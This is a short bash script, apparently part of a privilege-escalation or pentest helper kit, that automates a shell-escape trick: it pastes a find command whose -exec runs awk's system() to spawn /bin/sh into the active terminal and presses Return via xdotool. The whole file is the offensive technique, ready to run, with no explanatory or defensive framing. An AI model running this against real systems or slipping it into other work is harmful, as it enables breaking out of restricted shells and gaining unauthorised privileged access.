#!/bin/bash

: '
find - get interactive shell
'

paste_command "find / -name nameoffile -exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \;"
xdotool key Return
